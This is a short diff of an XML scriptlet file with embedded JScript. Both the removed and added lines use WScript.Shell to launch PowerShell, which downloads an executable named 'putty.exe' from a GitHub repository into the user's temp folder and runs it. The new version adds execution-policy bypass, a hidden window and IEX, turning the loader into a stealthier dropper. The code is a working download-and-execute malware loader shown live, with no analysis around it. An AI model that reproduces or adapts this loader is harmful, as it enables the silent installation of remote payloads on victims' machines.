@@ -11,7 +11,7 @@
 	<script language="JScript">
 		<![CDATA[
 	
-			new ActiveXObject("WScript.Shell").Run("powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/c0mp4s5/java/raw/master/putty.exe','C:\\Users\\%USERNAME%\\AppData\\local\\temp\\putty.exe');start-process 'C:\\Users\\%USERNAME%\\AppData\\local\\temp\\putty.exe'",0,true);
+			new ActiveXObject("WScript.Shell").Run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX (new-object System.Net.WebClient).DownloadFile('https://github.com/c0mp4s5/java/raw/master/putty.exe','C:\\Users\\%USERNAME%\\AppData\\local\\temp\\putty.exe');start-process 'C:\\Users\\%USERNAME%\\AppData\\local\\temp\\putty.exe'",0,true);
 	
 		]]>
 </script>
